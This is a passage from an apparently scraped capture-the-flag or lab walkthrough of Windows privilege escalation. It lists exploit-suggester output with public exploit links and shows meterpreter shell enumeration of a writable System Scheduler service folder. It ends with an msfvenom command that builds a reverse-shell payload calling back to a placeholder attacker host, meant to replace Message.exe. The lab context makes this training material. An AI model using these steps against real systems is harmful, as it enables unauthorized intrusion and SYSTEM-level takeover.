verflow%20(MS16-098)%0A[*]%0A[M]%20MS16-075:%20Security%20Update%20for%20Windows%20SMB%20Server%20(3164038)%20-%20Important%0A[*]%20%20%20https://github.com/foxglovesec/RottenPotato%0A[*]%20%20%20https://github.com/Kevin-Robertson/Tater%0A[*]%20%20%20https://bugs.chromium.org/p/project-zero/issues/detail?id=222%20--%20Windows:%20Local%20WebDAV%20NTLM%20Reflection%20Elevation%20of%20Privilege%0A[*]%20%20%20https://foxglovesecurity.com/2016/01/16/hot-potato/%20--%20Hot%20Potato%20-%20Windows%20Privilege%20Escalation%0A[*]%0A[E]%20MS16-074:%20Security%20Update%20for%20Microsoft%20Graphics%20Component%20(3164036)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/39990/%20--%20Windows%20-%20gdi32.dll%20Multiple%20DIB-Related%20EMF%20Record%20Handlers%20Heap-Based%20Out-of-Bounds%20Reads/Memory%20Disclosure%20(MS16-074),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/39991/%20--%20Windows%20Kernel%20-%20ATMFD.DLL%20NamedEscape%200x250C%20Pool%20Corruption%20(MS16-074),%20PoC%0A[*]%0A[E]%20MS16-063:%20Cumulative%20Security%20Update%20for%20Internet%20Explorer%20(3163649)%20-%20Critical%0A[*]%20%20%20https://www.exploit-db.com/exploits/39994/%20--%20Internet%20Explorer%2011%20-%20Garbage%20Collector%20Attribute%20Type%20Confusion%20(MS16-063),%20PoC%0A[*]%0A[E]%20MS16-032:%20Security%20Update%20for%20Secondary%20Logon%20to%20Address%20Elevation%20of%20Privile%20(3143141)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/40107/%20--%20MS16-032%20Secondary%20Logon%20Handle%20Privilege%20Escalation,%20MSF%0A[*]%20%20%20https://www.exploit-db.com/exploits/39574/%20--%20Microsoft%20Windows%208.1/10%20-%20Secondary%20Logon%20Standard%20Handles%20Missing%20Sanitization%20Privilege%20Escalation%20(MS16-032),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/39719/%20--%20Microsoft%20Windows%207-10%20&amp;%20Server%202008-2012%20(x32/x64)%20-%20Local%20Privilege%20Escalation%20(MS16-032)%20(PowerShell),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/39809/%20--%20Microsoft%20Windows%207-10%20&amp;%20Server%202008-2012%20(x32/x64)%20-%20Local%20Privilege%20Escalation%20(MS16-032)%20(C#)%0A[*]%0A[M]%20MS16-016:%20Security%20Update%20for%20WebDAV%20to%20Address%20Elevation%20of%20Privilege%20(3136041)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/40085/%20--%20MS16-016%20mrxdav.sys%20WebDav%20Local%20Privilege%20Escalation,%20MSF%0A[*]%20%20%20https://www.exploit-db.com/exploits/39788/%20--%20Microsoft%20Windows%207%20-%20WebDAV%20Privilege%20Escalation%20Exploit%20(MS16-016)%20(2),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/39432/%20--%20Microsoft%20Windows%207%20SP1%20x86%20-%20WebDAV%20Privilege%20Escalation%20(MS16-016)%20(1),%20PoC%0A[*]%0A[E]%20MS16-014:%20Security%20Update%20for%20Microsoft%20Windows%20to%20Address%20Remote%20Code%20Execution%20(3134228)%20-%20Important%0A[*]%20%20%20Windows%207%20SP1%20x86%20-%20Privilege%20Escalation%20(MS16-014),%20https://www.exploit-db.com/exploits/40039/,%20PoC%0A[*]%0A[E]%20MS16-007:%20Security%20Update%20for%20Microsoft%20Windows%20to%20Address%20Remote%20Code%20Execution%20(3124901)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/39232/%20--%20Microsoft%20Windows%20devenum.dll!DeviceMoniker::Load()%20-%20Heap%20Corruption%20Buffer%20Underflow%20(MS16-007),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/39233/%20--%20Microsoft%20Office%20/%20COM%20Object%20DLL%20Planting%20with%20WMALFXGFXDSP.dll%20(MS-16-007),%20PoC%0A[*]%0A[E]%20MS15-132:%20Security%20Update%20for%20Microsoft%20Windows%20to%20Address%20Remote%20Code%20Execution%20(3116162)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/38968/%20--%20Microsoft%20Office%20/%20COM%20Object%20DLL%20Planting%20with%20comsvcs.dll%20Delay%20Load%20of%20mqrt.dll%20(MS15-132),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/38918/%20--%20Microsoft%20Office%20/%20COM%20Object%20els.dll%20DLL%20Planting%20(MS15-134),%20PoC%0A[*]%0A[E]%20MS15-112:%20Cumulative%20Security%20Update%20for%20Internet%20Explorer%20(3104517)%20-%20Critical%0A[*]%20%20%20https://www.exploit-db.com/exploits/39698/%20--%20Internet%20Explorer%209/10/11%20-%20CDOMStringDataList::InitFromString%20Out-of-Bounds%20Read%20(MS15-112)%0A[*]%0A[E]%20MS15-111:%20Security%20Update%20for%20Windows%20Kernel%20to%20Address%20Elevation%20of%20Privilege%20(3096447)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/38474/%20--%20Windows%2010%20Sandboxed%20Mount%20Reparse%20Point%20Creation%20Mitigation%20Bypass%20(MS15-111),%20PoC%0A[*]%0A[E]%20MS15-102:%20Vulnerabilities%20in%20Windows%20Task%20Management%20Could%20Allow%20Elevation%20of%20Privilege%20(3089657)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/38202/%20--%20Windows%20CreateObjectTask%20SettingsSyncDiagnostics%20Privilege%20Escalation,%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/38200/%20--%20Windows%20Task%20Scheduler%20DeleteExpiredTaskAfter%20File%20Deletion%20Privilege%20Escalation,%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/38201/%20--%20Windows%20CreateObjectTask%20TileUserBroker%20Privilege%20Escalation,%20PoC%0A[*]%0A[E]%20MS15-097:%20Vulnerabilities%20in%20Microsoft%20Graphics%20Component%20Could%20Allow%20Remote%20Code%20Execution%20(3089656)%20-%20Critical%0A[*]%20%20%20https://www.exploit-db.com/exploits/38198/%20--%20Windows%2010%20Build%2010130%20-%20User%20Mode%20Font%20Driver%20Thread%20Permissions%20Privilege%20Escalation,%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/38199/%20--%20Windows%20NtUserGetClipboardAccessToken%20Token%20Leak,%20PoC%0A[*]%0A[M]%20MS15-078:%20Vulnerability%20in%20Microsoft%20Font%20Driver%20Could%20Allow%20Remote%20Code%20Execution%20(3079904)%20-%20Critical%0A[*]%20%20%20https://www.exploit-db.com/exploits/38222/%20--%20MS15-078%20Microsoft%20Windows%20Font%20Driver%20Buffer%20Overflow%0A[*]%0A[M]%20MS15-051:%20Vulnerabilities%20in%20Windows%20Kernel-Mode%20Drivers%20Could%20Allow%20Elevation%20of%20Privilege%20(3057191)%20-%20Important%0A[*]%20%20%20https://github.com/hfiref0x/CVE-2015-1701,%20Win32k%20Elevation%20of%20Privilege%20Vulnerability,%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/37367/%20--%20Windows%20ClientCopyImage%20Win32k%20Exploit,%20MSF%0A[*]%0A[E]%20MS14-068:%20Vulnerability%20in%20Kerberos%20Could%20Allow%20Elevation%20of%20Privilege%20(3011780)%20-%20Critical%0A[*]%20%20%20http://www.exploit-db.com/exploits/35474/%20--%20Windows%20Kerberos%20-%20Elevation%20of%20Privilege%20(MS14-068),%20PoC%0A[*]%0A[M]%20MS14-064:%20Vulnerabilities%20in%20Windows%20OLE%20Could%20Allow%20Remote%20Code%20Execution%20(3011443)%20-%20Critical%0A[*]%20%20%20https://www.exploit-db.com/exploits/37800//%20--%20Microsoft%20Windows%20HTA%20(HTML%20Application)%20-%20Remote%20Code%20Execution%20(MS14-064),%20PoC%0A[*]%20%20%20http://www.exploit-db.com/exploits/35308/%20--%20Internet%20Explorer%20OLE%20Pre-IE11%20-%20Automation%20Array%20Remote%20Code%20Execution%20/%20Powershell%20VirtualAlloc%20(MS14-064),%20PoC%0A[*]%20%20%20http://www.exploit-db.com/exploits/35229/%20--%20Internet%20Explorer%20%3C=%2011%20-%20OLE%20Automation%20Array%20Remote%20Code%20Execution%20(#1),%20PoC%0A[*]%20%20%20http://www.exploit-db.com/exploits/35230/%20--%20Internet%20Explorer%20%3C%2011%20-%20OLE%20Automation%20Array%20Remote%20Code%20Execution%20(MSF),%20MSF%0A[*]%20%20%20http://www.exploit-db.com/exploits/35235/%20--%20MS14-064%20Microsoft%20Windows%20OLE%20Package%20Manager%20Code%20Execution%20Through%20Python,%20MSF%0A[*]%20%20%20http://www.exploit-db.com/exploits/35236/%20--%20MS14-064%20Microsoft%20Windows%20OLE%20Package%20Manager%20Code%20Execution,%20MSF%0A[*]%0A[M]%20MS14-060:%20Vulnerability%20in%20Windows%20OLE%20Could%20Allow%20Remote%20Code%20Execution%20(3000869)%20-%20Important%0A[*]%20%20%20http://www.exploit-db.com/exploits/35055/%20--%20Windows%20OLE%20-%20Remote%20Code%20Execution%20'Sandworm'%20Exploit%20(MS14-060),%20PoC%0A[*]%20%20%20http://www.exploit-db.com/exploits/35020/%20--%20MS14-060%20Microsoft%20Windows%20OLE%20Package%20Manager%20Code%20Execution,%20MSF%0A[*]%0A[E]%20MS14-040:%20Vulnerability%20in%20Ancillary%20Function%20Driver%20(AFD)%20Could%20Allow%20Elevation%20of%20Privilege%20(2975684)%20-%20Important%0A[*]%20%20%20https://www.exploit-db.com/exploits/39525/%20--%20Microsoft%20Windows%207%20x64%20-%20afd.sys%20Privilege%20Escalation%20(MS14-040),%20PoC%0A[*]%20%20%20https://www.exploit-db.com/exploits/39446/%20--%20Microsoft%20Windows%20-%20afd.sys%20Dangling%20Pointer%20Privilege%20Escalation%20(MS14-040),%20PoC%0A[*]%0A[E]%20MS14-035:%20Cumulative%20Security%20Update%20for%20Internet%20Explorer%20(2969262)%20-%20Critical%0A[E]%20MS14-029:%20Security%20Update%20for%20Internet%20Explorer%20(2962482)%20-%20Critical%0A[*]%20%20%20http://www.exploit-db.com/exploits/34458/%0A[*]%0A[E]%20MS14-026:%20Vulnerability%20in%20.NET%20Framework%20Could%20Allow%20Elevation%20of%20Privilege%20(2958732)%20-%20Important%0A[*]%20%20%20http://www.exploit-db.com/exploits/35280/,%20--%20.NET%20Remoting%20Services%20Remote%20Command%20Execution,%20PoC%0A[*]%0A[M]%20MS14-012:%20Cumulative%20Security%20Update%20for%20Internet%20Explorer%20(2925418)%20-%20Critical%0A[M]%20MS14-009:%20Vulnerabilities%20in%20.NET%20Framework%20Could%20Allow%20Elevation%20of%20Privilege%20(2916607)%20-%20Important%0A[M]%20MS13-097:%20Cumulative%20Security%20Update%20for%20Internet%20Explorer%20(2898785)%20-%20Critical%0A[M]%20MS13-090:%20Cumulative%20Security%20Update%20of%20ActiveX%20Kill%20Bits%20(2900986)%20-%20Critical%0A[M]%20MS13-080:%20Cumulative%20Security%20Update%20for%20Internet%20Explorer%20(2879017)%20-%20Critical%0A[*]%20done" type="button"></button></div></div><pre><code>[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 8 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 249 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*]
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*]
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*]
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*]
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*]
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[*] done
</code></pre><p>From the <code>meterpreter</code> shell in <code>msfconsole -q</code>, check the version of <code>system scheuler</code> for identifying any known exploits.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%3E%20shell%0AC:%5CProgram%20Files%20(x86)%5CSystemScheduler%3Emore%20README.txt%0Amore%20README.txt%0A***System%20Scheduler%20Release%20Notes***%0A%0ASystem%20Scheduler%20Professional%20-%20Version%205.12%0AFix:%20Not%20correctly%20detecting%20Administrators%20when%20UAC%20is%20disabled%0AFix:%20Very%20rare%20bug%20where%20system%20scheduler%20waits%20for%20executed%20program%20to%20complete%20before%20processing%20next%20event%0AFix:%20Minor%20bug%20with%20Tray-Icon%20not%20reappearing%20when%20changing%20security%20settings" type="button"></button></div></div><pre><code>meterpreter&gt; shell
C:\Program Files (x86)\SystemScheduler&gt;more README.txt
more README.txt
***System Scheduler Release Notes***

System Scheduler Professional - Version 5.12
Fix: Not correctly detecting Administrators when UAC is disabled
Fix: Very rare bug where system scheduler waits for executed program to complete before processing next event
Fix: Minor bug with Tray-Icon not reappearing when changing security settings
</code></pre><p>Use <code>searchsploit</code> to check for any available exploits for <code>splinterware</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="searchsploit%20%22splinterware%22" type="button"></button></div></div><pre><code>searchsploit "splinterware"
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="--------------------------------------------------------------%20---------------------------------%0AExploit%20Title%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20Path%0A--------------------------------------------------------------%20---------------------------------%0ASplinterware%20System%20Scheduler%20Pro%205.12%20-%20Buffer%20Overflow%20(SEH%20%7C%20windows/local/45071.py%0ASplinterware%20System%20Scheduler%20Pro%205.12%20-%20Privilege%20Escalation%20%7C%20windows/local/45072.txt%0ASplinterware%20System%20Scheduler%20Professional%205.30%20-%20Privilege%20E%20%7C%20windows/local/49858.txt%0A--------------------------------------------------------------%20---------------------------------" type="button"></button></div></div><pre><code>-------------------------------------------------------------- ---------------------------------
Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Splinterware System Scheduler Pro 5.12 - Buffer Overflow (SEH | windows/local/45071.py
Splinterware System Scheduler Pro 5.12 - Privilege Escalation | windows/local/45072.txt
Splinterware System Scheduler Professional 5.30 - Privilege E | windows/local/49858.txt
-------------------------------------------------------------- ---------------------------------
</code></pre><p>Check the <code>acl</code> and service status for <code>SystemScheduler</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%3E%20shell%0AC:%5CProgram%20Files%20(x86)%5CSystemScheduler%3Eicacls%20%22c:%5CProgram%20Files%20(x86)%5CSystemScheduler%22%0Aicacls%20%22c:%5CProgram%20Files%20(x86)%5CSystemScheduler%22%0Ac:%5CProgram%20Files%20(x86)%5CSystemScheduler%20Everyone:(OI)(CI)(M)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20NT%20SERVICE%5CTrustedInstaller:(I)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20NT%20SERVICE%5CTrustedInstaller:(I)(CI)(IO)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM:(I)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM:(I)(OI)(CI)(IO)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20BUILTIN%5CAdministrators:(I)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20BUILTIN%5CAdministrators:(I)(OI)(CI)(IO)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20BUILTIN%5CUsers:(I)(RX)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20BUILTIN%5CUsers:(I)(OI)(CI)(IO)(GR,GE)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20CREATOR%20OWNER:(I)(OI)(CI)(IO)(F)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20APPLICATION%20PACKAGE%20AUTHORITY%5CALL%20APPLICATION%20PACKAGES:(I)(RX)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20APPLICATION%20PACKAGE%20AUTHORITY%5CALL%20APPLICATION%20PACKAGES:(I)(OI)(CI)(IO)(GR,GE)%0A%0ASuccessfully%20processed%201%20files;%20Failed%20processing%200%20files%0A%0AC:%5CProgram%20Files%20(x86)%5CSystemScheduler%3Esc%20qc%20WindowsScheduler%0Asc%20qc%20WindowsScheduler%0A%20%20%20%20[SC]%20QueryServiceConfig%20SUCCESS%0A%0A%20%20%20%20SERVICE_NAME:%20WindowsScheduler%0A%20%20%20%20%20%20%20%20%20%20%20%20TYPE%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%2010%20%20WIN32_OWN_PROCESS%0A%20%20%20%20%20%20%20%20%20%20%20%20START_TYPE%20%20%20%20%20%20%20%20%20:%202%20%20%20AUTO_START%0A%20%20%20%20%20%20%20%20%20%20%20%20ERROR_CONTROL%20%20%20%20%20%20:%200%20%20%20IGNORE%0A%20%20%20%20%20%20%20%20%20%20%20%20BINARY_PATH_NAME%20%20%20:%20C:%5CPROGRA~2%5CSYSTEM~1%5CWService.exe%0A%20%20%20%20%20%20%20%20%20%20%20%20LOAD_ORDER_GROUP%20%20%20:%0A%20%20%20%20%20%20%20%20%20%20%20%20TAG%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%200%0A%20%20%20%20%20%20%20%20%20%20%20%20DISPLAY_NAME%20%20%20%20%20%20%20:%20System%20Scheduler%20Service%0A%20%20%20%20%20%20%20%20%20%20%20%20DEPENDENCIES%20%20%20%20%20%20%20:%0A%20%20%20%20%20%20%20%20%20%20%20%20SERVICE_START_NAME%20:%20LocalSystem" type="button"></button></div></div><pre><code>meterpreter&gt; shell
C:\Program Files (x86)\SystemScheduler&gt;icacls "c:\Program Files (x86)\SystemScheduler"
icacls "c:\Program Files (x86)\SystemScheduler"
c:\Program Files (x86)\SystemScheduler Everyone:(OI)(CI)(M)
                                    NT SERVICE\TrustedInstaller:(I)(F)
                                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                    BUILTIN\Administrators:(I)(F)
                                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                    BUILTIN\Users:(I)(RX)
                                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\SystemScheduler&gt;sc qc WindowsScheduler
sc qc WindowsScheduler
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: WindowsScheduler
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 0   IGNORE
            BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : System Scheduler Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem
</code></pre><p>Check the logs in the target machine from the path <code>c:\Program Files (x86)\SystemScheduler</code>. There will be a scheduled task which invokes <code>Message.exe</code> file. This can be exploited and replaced with <code>reverse shell</code> payload, since the path is writable and has <code>system</code> context.</p><p>Create a new <code>reverse shell</code> payload pointing to different port.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/meterpreter/reverse_tcp%20-a%20x86%20--encoder%20x86/shikata_ga_nai%20LHOST=%3Csource-ip%3E%20LPORT=4444%20-f%20exe%20-o%20Message.exe" type="button"></button></div></div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=&lt;source-ip&gt; LPORT=4444 -f exe -o Message.exe
